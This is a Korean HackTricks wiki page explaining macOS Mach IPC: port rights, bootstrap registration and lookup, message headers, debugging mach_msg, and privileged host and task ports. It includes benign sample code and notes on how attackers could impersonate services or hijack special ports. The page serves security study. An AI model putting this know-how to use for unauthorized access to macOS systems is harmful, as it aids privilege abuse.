# macOS IPC - 프로세스 간 통신

{% hint style="success" %}
AWS 해킹 배우고 실습하기:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP 해킹 배우고 실습하기: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원하기</summary>

* [**구독 요금제**](https://github.com/sponsors/carlospolop) 확인하기!
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass) 참여하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** 팔로우하기**.
* [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 저장소에 PR을 제출하여 해킹 요령 공유하기.

</details>
{% endhint %}

## 포트를 통한 Mach 메시징

### 기본 정보

Mach는 **작업**을 **리소스 공유의 가장 작은 단위**로 사용하며, 각 작업에는 **여러 스레드**가 포함될 수 있습니다. 이러한 **작업과 스레드는 1:1로 POSIX 프로세스와 스레드에 매핑**됩니다.

작업 간 통신은 Mach Inter-Process Communication (IPC)을 통해 이루어지며, **커널이 관리하는 메시지 큐처럼 작동하는 포트 간에 메시지가 전송**됩니다.

**포트**는 Mach IPC의 **기본 요소**입니다. 메시지를 **보내고 받는 데 사용**할 수 있습니다.

각 프로세스에는 **IPC 테이블**이 있어 **프로세스의 mach 포트**를 찾을 수 있습니다. Mach 포트의 이름은 실제로 숫자(커널 객체에 대한 포인터)입니다.

프로세스는 또한 **다른 작업에게 일부 권한을 가진 포트 이름을 보낼 수 있으며**, 커널은 이를 다른 작업의 **IPC 테이블에 등록**합니다.

### 포트 권한

작업이 수행할 수 있는 작업을 정의하는 포트 권한은 이 통신에 중요합니다. 가능한 **포트 권한**은 ([여기에서 정의된 내용](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

* **수신 권한**은 포트로 전송된 메시지를 수신할 수 있게 합니다. Mach 포트는 MPSC (다중 생산자, 단일 소비자) 큐이므로 전체 시스템에서 각 포트에 대해 **하나의 수신 권한만** 있을 수 있습니다 (여러 프로세스가 하나의 파이프의 읽기 끝에 대한 파일 디스크립터를 모두 보유할 수 있는 파이프와는 달리).
* **수신 권한을 가진 작업**은 메시지를 수신하고 **송신 권한을 생성**할 수 있어 메시지를 보낼 수 있습니다. 처음에는 **자체 작업만 수신 권한을 가집니다**.
* 수신 권한의 소유자가 **죽거나 종료**하면 **송신 권한이 무용지물이 됩니다 (죽은 이름).**
* **송신 권한**은 포트로 메시지를 보낼 수 있게 합니다.
* 송신 권한은 **복제**될 수 있어 송신 권한을 가진 작업이 권한을 복제하고 **제3의 작업에게 부여**할 수 있습니다.
* **포트 권한**은 Mac 메시지를 통해 **전달**될 수도 있습니다.
* **한 번 송신 권한**은 포트로 한 번의 메시지를 보낼 수 있고 그 후 사라집니다.
* 이 권한은 **복제**될 수 없지만 **이동**될 수 있습니다.
* **포트 집합 권한**은 단일 포트가 아닌 _포트 세트_를 나타냅니다. 포트 세트에서 메시지를 디큐하는 것은 그 포트가 포함하는 포트 중 하나에서 메시지를 디큐합니다. 포트 세트는 Unix의 `select`/`poll`/`epoll`/`kqueue`와 매우 유사하게 여러 포트에서 동시에 수신할 수 있습니다.
* **죽은 이름**은 실제 포트 권한이 아니라 단순히 자리 표시자입니다. 포트가 파괴되면 포트에 대한 모든 기존 포트 권한이 죽은 이름으로 변합니다.

**작업은 다른 작업에게 송신 권한을 전달**하여 메시지를 다시 보낼 수 있습니다. **송신 권한은 복제**될 수 있어 작업이 권한을 복제하고 **제3의 작업에게 권한을 부여**할 수 있습니다. 이는 **부트스트랩 서버**라는 중간 프로세스와 결합되어 작업 간 효과적인 통신을 가능하게 합니다.

### 파일 포트

파일 포트는 Mac 포트(맥 포트 권한을 사용)에 파일 디스크립터를 캡슐화할 수 있습니다. 주어진 FD에서 `fileport_makeport`를 사용하여 `fileport`를 만들고 `fileport_makefd`를 사용하여 fileport에서 FD를 만들 수 있습니다.

### 통신 설정

이전에 언급했듯이 Mach 메시지를 사용하여 권한을 보낼 수 있지만, 이미 Mach 메시지를 보낼 권한이 없는 경우 **권한을 보내려면 이미 권한이 있어야 합니다**. 그렇다면 첫 번째 통신은 어떻게 설정됩니까?

이를 위해 **부트스트랩 서버**(**mac의 launchd**)가 관여됩니다. **누구나 부트스트랩 서버에 SEND 권한을 얻을 수 있으므로**, 다른 프로세스에 메시지를 보낼 권한을 요청할 수 있습니다:

1. 작업 **A**는 **새 포트**를 생성하여 **그것에 대한 수신 권한**을 얻습니다.
2. 수신 권한을 보유한 작업 **A**는 **포트에 대한 송신 권한을 생성**합니다.
3. 작업 **A**는 **부트스트랩 서버**와 **연결을 설정**하고, 처음에 생성한 포트에 대한 **송신 권한을 부트스트랩 서버에 보냅니다**.
* 누구나 부트스트랩 서버에 SEND 권한을 얻을 수 있습니다.
4. 작업 A는 부트스트랩 서버에 `bootstrap_register` 메시지를 보내 **`com.apple.taska`**와 같은 이름으로 지정된 포트를 **연결**합니다.
5. 작업 **B**는 서비스 이름에 대한 부트스트랩 **룩업을 실행**하기 위해 **부트스트랩 서버**와 상호 작용합니다 (`bootstrap_lookup`). 따라서 부트스트랩 서버가 응답하려면 작업 B는 룩업 메시지 내에서 이전에 생성한 **포트에 대한 SEND 권한을 부트스트랩 서버에 보냅니다**. 룩업이 성공하면 **서버는 Task A로부터 받은 SEND 권한을 복제**하고 **Task B에게 전송**합니다.
* 누구나 부트스트랩 서버에 SEND 권한을 얻을 수 있습니다.
6. 이 SEND 권한으로 **작업 B**는 **작업 A에게 메시지를 보낼 수 있습니다**.
7. 양방향 통신을 위해 일반적으로 작업 **B**는 **수신 권한과 송신 권한이 있는 새 포트를 생성**하고 **송신 권한을 작업 A에게 제공**하여 작업 B에게 메시지를 보낼 수 있게 합니다 (양방향 통신).

부트스트랩 서버는 작업이 주장하는 서비스 이름을 인증할 수 없습니다. 이는 **작업**이 잠재적으로 **시스템 작업을 가장할 수 있음**을 의미합니다. 예를 들어 권한 서비스 이름을 가장하여 모든 요청을 승인할 수 있습니다.

그런 다음 Apple은 시스템 제공 서비스의 **이름을 안전한 구성 파일에 저장**합니다. 이 파일은 **SIP로 보호된** 디렉토리인 `/System/Library/LaunchDaemons` 및 `/System/Library/LaunchAgents`에 있습니다. 각 서비스 이름 옆에는 **관련된 이진 파일도 저장**됩니다. 부트스트랩 서버는 이러한 서비스 이름마다 **수신 권한을 생성하고 보유**합니다.

이러한 사전 정의된 서비스에 대해서는 **룩업 프로세스가 약간 다릅니다**. 서비스 이름이 조회될 때, launchd는 서비스를 동적으로 시작합니다. 새로운 워크플로우는 다음과 같습니다:

* 작업 **B**는 서비스 이름에 대한 부트스트랩 **룩업**을 시작합니다.
* **launchd**는 작업이 실행 중인지 확인하고 실행 중이 아니면 **시작**합니다.
* 작업 **A** (서비스)는 **부트스트랩 체크인**(`bootstrap_check_in()`)을 수행합니다. 여기서 **부트스트랩** 서버는 SEND 권한을 생성하고 보유하며 **수신 권한을 작업 A에게 전달**합니다.
* launchd는 **SEND 권한을 복제하고 작업 B에게 전송**합니다.
* 작업 **B**는 **수신 권한과 송신 권한이 있는 새 포트를 생성**하고 **송신 권한을 작업 A**에게 제공하여 작업 B에게 메시지를 보낼 수 있게 합니다 (양방향 통신).

그러나 이 프로세스는 사전 정의된 시스템 작업에만 적용됩니다. 비시스템 작업은 여전히 처음에 설명한 대로 작동하며, 이는 가장할 수 있는 가능성을 열어둘 수 있습니다.

{% hint style="danger" %}
따라서 launchd가 절대로 충돌해서는 안 되며, 그렇게 되면 전체 시스템이 충돌합니다.
{% endhint %}
### Mach 메시지

[더 많은 정보는 여기에서 찾을 수 있습니다](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

`mach_msg` 함수는 본질적으로 시스템 호출로, Mach 메시지를 보내고 받기 위해 사용됩니다. 이 함수는 보내야 하는 메시지를 초기 인자로 필요로 합니다. 이 메시지는 `mach_msg_header_t` 구조체로 시작해야 하며  실제 메시지 내용이 뒤따라야 합니다. 이 구조체는 다음과 같이 정의됩니다:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
프로세스가 _**수신 권한**_을 보유하면 Mach 포트에서 메시지를 수신할 수 있습니다. 반대로 **보내는 쪽(sender)**은 _**송신 권한**_ 또는 _**일회용 송신 권한**_을 부여받습니다. 일회용 송신 권한은 한 번의 메시지를 보낸 후에 무효화됩니다.

초기 필드 **`msgh_bits`**는 비트맵입니다:

* 첫 번째 비트(가장 중요함)는 메시지가 복잡함을 나타내는 데 사용됩니다(자세한 내용은 아래 참조)
* 3번째와 4번째 비트는 커널에 의해 사용됩니다
* 두 번째 바이트의 **가장 낮은 5개 비트**는 **바우처(voucher)**에 사용할 수 있습니다: 키/값 조합을 보내는 또 다른 유형의 포트입니다.
* 세 번째 바이트의 **가장 낮은 5개 비트**는 **로컬 포트**에 사용할 수 있습니다
* 네 번째 바이트의 **가장 낮은 5개 비트**는 **원격 포트**에 사용할 수 있습니다

바우처, 로컬 및 원격 포트에 지정할 수 있는 유형은 다음과 같습니다([**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html) 참조):
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
예를 들어, `MACH_MSG_TYPE_MAKE_SEND_ONCE`는 이 포트를 위해 파생 및 전송되어야 하는 **한 번만 보내기** 권한을 나타내는 데 사용될 수 있습니다. 또한 수신자가 응답을 보낼 수 없도록 하려면 `MACH_PORT_NULL`을 지정할 수 있습니다.

쉬운 **양방향 통신**을 위해 프로세스는 메시지 헤더의 **응답 포트**(**`msgh_local_port`**)라고 불리는 mach 포트를 지정할 수 있으며, 메시지의 **수신자**는 이 메시지에 대한 응답을 보낼 수 있습니다.

{% hint style="success" %}
이러한 종류의 양방향 통신은 응답을 기대하는 XPC 메시지에서 사용되며 (`xpc_connection_send_message_with_reply` 및 `xpc_connection_send_message_with_reply_sync`), **일반적으로 서로 다른 포트가 생성**되어 양방향 통신을 생성하는 방법에 대해 이전에 설명한 대로 사용됩니다.
{% endhint %}

메시지 헤더의 다른 필드는 다음과 같습니다:

- `msgh_size`: 전체 패킷의 크기.
- `msgh_remote_port`: 이 메시지가 전송된 포트.
- `msgh_voucher_port`: [mach 바우처](https://robert.sesek.com/2023/6/mach\_vouchers.html).
- `msgh_id`: 수신자가 해석하는 이 메시지의 ID.

{% hint style="danger" %}
**mach 메시지는 `mach 포트`를 통해 전송**되며, 이는 mach 커널에 내장된 **단일 수신자**, **다중 송신자** 통신 채널입니다. **여러 프로세스**가 mach 포트로 메시지를 **보낼 수 있지만**, 언제든지 **단일 프로세스만** 읽을 수 있습니다.
{% endhint %}

그런 다음 메시지는 **`mach_msg_header_t`** 헤더, **바디** 및 **트레일러**(있는 경우)로 형성되며, 응답 권한을 부여할 수 있습니다. 이러한 경우에는 커널이 메시지를 한 작업에서 다른 작업으로 전달하기만 하면 됩니다.

**트레일러**는 **커널에 의해 메시지에 추가된 정보**로(사용자가 설정할 수 없음) 메시지 수신 시 `MACH_RCV_TRAILER_<trailer_opt>` 플래그로 요청할 수 있습니다(요청할 수 있는 다양한 정보가 있음).

#### 복잡한 메시지

그러나 커널이 수신자에게 이러한 객체를 전송해야 하는 추가 포트 권한이나 메모리 공유와 같은 **더 복잡한** 메시지도 있습니다. 이러한 경우에는 헤더 `msgh_bits`의 가장 상위 비트가 설정됩니다.

전달할 수 있는 가능한 디스크립터는 [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)에서 정의됩니다.
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
### Mac Ports APIs

포트는 작업 네임스페이스에 연결되어 있으므로 포트를 생성하거나 검색하려면 작업 네임스페이스도 쿼리됩니다 (`mach/mach_port.h`에서 자세히 설명):

- **`mach_port_allocate` | `mach_port_construct`**: 포트를 **생성**합니다.
- `mach_port_allocate`는 **포트 세트**를 생성할 수도 있습니다: 포트 그룹에 대한 수신 권한. 메시지를 수신할 때 어디서 메시지가 왔는지 표시됩니다.
- `mach_port_allocate_name`: 포트의 이름을 변경합니다 (기본적으로 32비트 정수).
- `mach_port_names`: 대상에서 포트 이름 가져오기
- `mach_port_type`: 이름에 대한 작업의 권한 가져오기
- `mach_port_rename`: 포트의 이름 바꾸기 (FD의 dup2와 유사)
- `mach_port_allocate`: 새로운 RECEIVE, PORT\_SET 또는 DEAD\_NAME 할당
- `mach_port_insert_right`: 수신할 수 있는 포트에 새로운 권한 생성
- `mach_port_...`
- **`mach_msg`** | **`mach_msg_overwrite`**: **mach 메시지를 보내고 받는 데 사용되는 함수**입니다. 덮어쓰기 버전은 메시지 수신을 위한 다른 버퍼를 지정할 수 있습니다 (다른 버전은 그냥 재사용합니다).

### Debug mach\_msg

함수 **`mach_msg`**와 **`mach_msg_overwrite`**는 메시지를 보내고 받는 데 사용되는 함수이므로 이러한 함수에 중단점을 설정하면 보낸 메시지와 받은 메시지를 검사할 수 있습니다.

예를 들어 디버깅할 수 있는 모든 응용 프로그램을 시작하면 이 함수를 사용할 것이므로 **`libSystem.B`를 로드**할 것입니다.

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Breakpoint 1: where = libsystem_kernel.dylib`mach_msg, address = 0x00000001803f6c20
<strong>(lldb) r
</strong>Process 71019 launched: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
Process 71019 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 &#x3C;+0>:  pacibsp
0x181d3ac24 &#x3C;+4>:  sub    sp, sp, #0x20
0x181d3ac28 &#x3C;+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c &#x3C;+12>: add    x29, sp, #0x10
Target 0: (SandboxedShellApp) stopped.
<strong>(lldb) bt
</strong>* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
frame #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
frame #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
frame #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
frame #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
frame #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
frame #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
frame #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
frame #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
frame #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&#x26;) const::$_0::operator()() const + 168
</code></pre>

**`mach_msg`**의 인수를 얻으려면 레지스터를 확인하십시오. 이것이 인수들입니다 ([mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html) 참조):
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
레지스트리에서 값을 가져옵니다:
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
메시지 헤더를 검사하여 첫 번째 인수를 확인하십시오:
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
그 유형의 `mach_msg_bits_t`는 응답을 허용하는 데 매우 일반적입니다.



### 포트 나열
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
**이름**은 포트에 기본적으로 지정된 이름입니다 (첫 3바이트에서 **증가**하는 방법을 확인하십시오). **`ipc-object`**는 포트의 **가려진** 고유 **식별자**입니다.\
또한 **`send`** 권한만 있는 포트는 해당 소유자를 **식별**하는 데 사용됨을 주목하십시오 (포트 이름 + pid).\
또한 **`+`**를 사용하여 **동일한 포트에 연결된 다른 작업**을 나타내는 방법에 주목하십시오.

또한 [**procesxp**](https://www.newosxbook.com/tools/procexp.html)를 사용하여 **등록된 서비스 이름**도 볼 수 있습니다 (SIP가 비활성화되어 있어 `com.apple.system-task-port`가 필요한 경우):
```
procesp 1 ports
```
이 도구를 iOS에 설치하려면 [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)에서 다운로드할 수 있습니다.

### 코드 예시

**sender**가 포트를 할당하고 `org.darlinghq.example` 이름에 대한 **send right**를 생성하여 이를 **부트스트랩 서버**에 보낸 것을 주목하십시오. 수신자는 해당 이름에 대한 **send right**를 요청하고 이를 사용하여 **메시지를 보냈습니다**.

{% tabs %}
{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{% endtab %}

{% tab title="sender.c" %}sender.c 파일{% endtab %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{% endtab %}
{% endtabs %}

## 특권 포트

일부 특별한 포트는 작업이 해당 포트에 대한 **SEND** 권한을 갖는 경우 **특정 민감한 작업을 수행하거나 특정 민감한 데이터에 액세스**할 수 있도록 합니다. 이는 이러한 포트가 공격자의 관점에서 매우 흥미로울 뿐만 아니라 **작업 간에 SEND 권한을 공유**할 수 있기 때문입니다.

### 호스트 특수 포트

이러한 포트는 숫자로 표시됩니다.

**SEND** 권한은 **`host_get_special_port`**를 호출하여 얻을 수 있으며 **RECEIVE** 권한은 **`host_set_special_port`**를 호출하여 얻을 수 있습니다. 그러나 두 호출 모두 **루트만 액세스할 수 있는 `host_priv`** 포트가 필요합니다. 또한 과거에 루트가 **`host_set_special_port`**를 호출하고 임의로 탈취할 수 있었으며, 예를 들어 `HOST_KEXTD_PORT`를 탈취하여 코드 서명을 우회할 수 있었습니다 (SIP가 이를 방  지하도록 변경되었습니다).

이러한 포트는 2개의 그룹으로 나뉩니다: **첫 7개 포트는 커널이 소유**하며 1은 `HOST_PORT`, 2는 `HOST_PRIV_PORT`, 3은 `HOST_IO_MASTER_PORT`이고 7은 `HOST_MAX_SPECIAL_KERNEL_PORT`입니다.\
**8부터 시작하는 포트는 시스템 데몬이 소유**하며 [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host\_special\_ports.h.auto.html)에서 선언된 포트를 찾을 수 있습니다.

* **호스트 포트**: 프로세스가 이 포트에 대한 **SEND** 권한을 갖는 경우 시스템에 대한 **정보**를 얻을 수 있으며 다음과 같은 루틴을 호출할 수 있습니다:
* `host_processor_info`: 프로세서 정보 가져오기
* `host_info`: 호스트 정보 가져오기
* `host_virtual_physical_table_info`: 가상/물리 페이지 테이  블 (MACH\_VMDEBUG 필요)
* `host_statistics`: 호스트 통계 가져오기
* `mach_memory_info`: 커널 메모리 레이아웃 가져오기
* **호스트 Priv 포트**: 이 포트에 대한 **SEND** 권한을 갖는 프로, 세스는 부팅 데이터를 표시하거나 커널 확장을 로드하려는 **특권 작업**을 수행할 수 있습니다. 이 권한을 얻으려면 **프로세스가 루트여야**합니다.
* 또한 **`kext_request`** API를 호출하려면 Apple 이진 파일에만 제공되는 **`com.apple.private.kext*`** 기타 엔티틀먼트가 필요합니다.
* 호출할 수 있는 다른 루틴은 다음과 같습니다:
* `host_get_boot_info`: `machine_boot_info()` 가져오기
* `host_priv_statistics`: 특권 통계 가져오기
* `vm_allocate_cpm`: 연속 물리 메모리 할당
* `host_processors`: 호스트 프로세서에 대한 SEND 권한
* `mach_vm_wire`: 메모리 상주화
* **루트**가 이 권한에 액세스할 수 있으므로 `host_set_[special/exception]_port[s]`를 호출하여 **호스트 특수 또는 예외 포트를 탈취**할 수 있습니다.

모든 호스트 특수 포트를 볼 수 있습니다.
```bash
procexp all ports | grep "HSP"
```
### 특별 포트 작업

이 포트들은 잘 알려진 서비스를 위해 예약된 포트들입니다. `task_[get/set]_special_port`를 호출하여 이러한 포트들을 가져오거나 설정할 수 있습니다. 이러한 포트들은 `task_special_ports.h`에서 찾을 수 있습니다:
```c
typedef	int	task_special_port_t;

#define TASK_KERNEL_PORT	1	/* Represents task to the outside
world.*/
#define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
#define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
#define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
#define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
```
[여기](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task\_get\_special\_port.html)에서:

* **TASK\_KERNEL\_PORT**\[task-self send right]: 이 작업을 제어하는 데 사용되는 포트. 작업에 영향을 주는 메시지를 보내기 위해 사용됩니다. 이는 **mach\_task\_self (아래의 작업 포트 참조)**에 의해 반환된 포트입니다.
* **TASK\_BOOTSTRAP\_PORT**\[bootstrap send right]: 작업의 부트스트랩 포트. 다른 시스템 서비스 포트의 반환을 요청하는 메시지를 보내기 위해 사용됩니다.
* **TASK\_HOST\_NAME\_PORT**\[host-self send right]: 포함된 호스트의 정보를 요청하는 데 사용되는 포트. 이는 **mach\_host\_self**에 의해 반환된 포트입니다.
* **TASK\_WIRED\_LEDGER\_PORT**\[ledger send right]: 이 작업이 유선 커널 메모리를 가져오는 소스를 명명하는 포트.
* **TASK\_PAGED\_LEDGER\_PORT**\[ledger send right]: 이 작업이 기본 메모리 관리 메모리를 가져오는 소스를 명명하는 포트.

### 작업 포트

원래 Mach에는 "프로세스"가 아닌 "작업"이 있었으며 이는 스레드의 컨테이너처럼 고려되었습니다. Mach가 BSD와 병합될 때 **각 작업은 BSD 프로세스와 관련**되었습니다. 따라서 모든 BSD 프로세스에는 프로세스로서 필요한 세부 정보가 있고 모든 Mach 작업에도 내부 작업이 있습니다 (커널 작업인 존재하지 않는 pid 0인 경우를 제외).

이와 관련된 두 가지 매우 흥미로운 함수가 있습니다:

* `task_for_pid(target_task_port, pid, &task_port_of_pid)`: `pid`로 지정된 작업과 관련된 작업 포트에 대한 SEND 권한을 얻고 일반적으로 `mach_task_self()`를 사용한 호출자 작업인 `target_task_port`에 제공합니다. (다른 작업에 대한 SEND 포트일 수 있음.)
